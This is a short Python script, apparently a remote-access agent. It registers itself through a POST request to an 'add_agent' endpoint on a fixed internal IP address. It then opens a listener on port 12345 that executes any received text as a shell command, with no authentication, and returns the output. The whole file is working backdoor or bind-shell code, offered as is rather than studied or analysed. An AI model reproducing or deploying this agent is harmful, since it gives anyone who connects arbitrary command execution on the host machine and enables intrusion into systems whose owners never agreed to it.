import socket
import subprocess
import requests

def add_agent():

# API endpoint
    url = 'http://192.168.1.100:8080/add_agent'

# Gönderilecek veri
    data = {
        'port': 9091,
        'user': 'Username'
    }

# POST isteği gönderme
    response = requests.post(url, json=data)

# Yanıtı kontrol etme
    if response.status_code == 201:
        print('Agent added successfully')
    else:
        print('Failed to add agent')

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))
    server_socket.listen(5)
    print("Server is listening on port 12345...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address} has been established!")
        
        while True:
            try:
                command = client_socket.recv(1024).decode("utf-8")
                print(f"Received command: {command}")
                
                if command.lower() == 'exit':
                    print("Closing connection with the client...")
                    client_socket.close()
                    break
                
                # Execute the command and capture the output
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output = result.stdout + result.stderr
                
                if not output:
                    output = "Command executed successfully, no output to show."
                
                print(f"Command output: {output}")
                client_socket.send(output.encode("utf-8"))
            except Exception as e:
                print(f"Error: {e}")
                client_socket.send(f"Error: {e}".encode("utf-8"))

if __name__ == "__main__":
    add_agent()
    start_server()